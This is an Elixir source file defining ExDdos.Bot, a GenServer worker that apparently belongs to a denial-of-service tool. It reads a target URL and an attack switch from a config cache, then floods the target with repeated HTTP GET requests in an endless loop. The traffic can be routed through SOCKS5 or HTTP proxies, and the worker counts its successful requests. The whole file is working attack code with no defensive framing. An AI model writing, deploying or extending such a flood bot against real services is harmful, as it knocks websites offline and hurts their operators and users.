defmodule ExDdos.Bot do
  use GenServer, restart: :transient

  require Logger

  def start_link(args), do: GenServer.start_link(__MODULE__, args)

  @impl true
  def init(args) do
    loop()
    {:ok, [hackney: [pool: :big_pool], proxy: proxy_opts(args)]}
  end

  defp loop, do: Process.send(self(), :loop, [])

  defp proxy_opts(scheme: "socks5", host: host, port: port), do: {:socks5, host, port}

  defp proxy_opts(host: host, port: port), do: {host, port}

  defp proxy_opts(_), do: nil

  @impl true
  def handle_info(:loop, request_opts) do
    with true <- should_attack?(request_opts),
         {:target, url} <- get_target(),
         {:ok, response} <- make_request(url, request_opts) do
      Logger.info("status code - #{response.status_code}")
      Cachex.incr(:counts, "success_req_count", 1)
      loop()
      {:noreply, request_opts}
    end
  end

  defp should_attack?(request_opts) do
    case Cachex.get!(:config_store, "attack?") do
      true ->
        true

      _ ->
        loop()
        {:noreply, request_opts}
    end
  end

  defp get_target do
    case Cachex.get!(:config_store, "url") do
      nil ->
        Logger.warning("misconfig")
        exit(:normal)

      url ->
        {:target, url}
    end
  end

  defp make_request(url, request_opts) do
    case HTTPoison.get(url, %{}, request_opts) do
      {:ok, _} = res ->
        res

      {:error, %HTTPoison.Error{} = err} ->
        Logger.warning("can't make request - #{inspect(err)}")
        exit(:normal)
    end
  end
end
